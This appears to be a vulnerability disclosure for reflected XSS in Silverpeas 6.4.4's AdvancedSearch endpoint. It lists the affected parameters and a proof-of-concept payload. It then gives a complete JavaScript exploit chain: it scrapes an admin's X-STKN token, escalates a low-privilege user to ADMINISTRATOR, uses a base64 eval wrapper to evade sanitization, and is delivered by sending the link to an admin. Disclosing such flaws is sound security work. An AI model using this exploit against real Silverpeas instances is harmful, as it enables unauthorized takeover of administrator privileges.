## Description:
The AdvancedSearch function's parameters are vulnerable to reflected XSS. Attackers can inject malicious payloads to execute arbitrary JavaScript, potentially leading to privilege escalation.

## Affected Version:
6.4.4

## Locations:
**GET /silverpeas/RpdcSearch/jsp/AdvancedSearch**

**Vulnerable Parameters**: sortOrder, ResultPageId, SortResXForm, sortImp, createafterdate, createbeforedate

## POC:
Inject the URL-encoded XSS payload `xss%22%2F%3E%3Cimg%20src%3D1%20onerror%3Dalert%281234%29%3E` into the **sortOrder** parameter to confirm reflected XSS

## Privilege Escalation via Reflected XSS*
1. Create **user1** - a low-privilege user.

2. Log in as **user1**.

3. Query the user profile in the domain to retrieve user1's **Iduser** and **Iddomain**.

4. Craft an XSS payload to escalate user1's privileges to admin:
   - The payload sends a GET request to **/silverpeas/RjobDomainPeas/jsp/domainNavigation?Iddomain=<domain-id>** to set the admin's state for querying domain <domain-id>.
   - It fetches HTML from */silverpeas/RjobDomainPeas/jsp/domainContent* and extracts the admin's **X-STKN** token from the DOM `(<td class="ArrayCell"><a href='/silverpeas/RjobDomainPeas/jsp/userContent?Iduser=0&X-STKN=<token>'>Administrateur</a></td>)`.
   - It sends a GET request to **/silverpeas/RjobDomainPeas/jsp/userUpdate?Iduser=<user1-id>&userLastName=<user1-lastName>&userPasswordValid=true&userAccessLevel=ADMINISTRATOR&X-STKN=<token>** to escalate user1 to admin.

```js
(async () => {
    try {
        await fetch('http://localhost:6969/silverpeas/RjobDomainPeas/jsp/domainGoTo?Iddomain=<domain-id>', { method: 'GET', credentials: 'include' }); // change admin state to retrieve iddomain 0
        const response = await fetch('http://localhost:6969/silverpeas/RjobDomainPeas/jsp/domainContent', { method: 'GET', credentials: 'include' }); 
        const html = await response.text();
        const doc = new DOMParser().parseFromString(html, 'text/html'); // get HTML DOM of domain content page
        const token = doc.querySelector('a[href*="X-STKN"]').href.split('X-STKN=')[1]; // extract admin X-STKN token
        await fetch(`http://localhost:6969/silverpeas/RjobDomainPeas/jsp/userUpdate?Iduser=<user1-id>&userLastName=<user1-lastName>&userPasswordValid=true&userAccessLevel=ADMINISTRATOR&X-STKN=${encodeURIComponent(token)}`, { method: 'GET', credentials: 'include' }); // update access level of user1 to admin
    } catch (error) {}
})();
```

5. Base64-encode the payload to evade sanitization, then embed it in an XSS vector: `xss"/><img src=x onerror=eval(atob('base64-encoded-payload'))>`.

6. Craft and inject the URL-encoded XSS payload into the **sortOrder** parameter to confirm reflected XSS

7. Send the malicious URL to an admin. When the admin visits it, the payload executes, escalating user1 to admin.


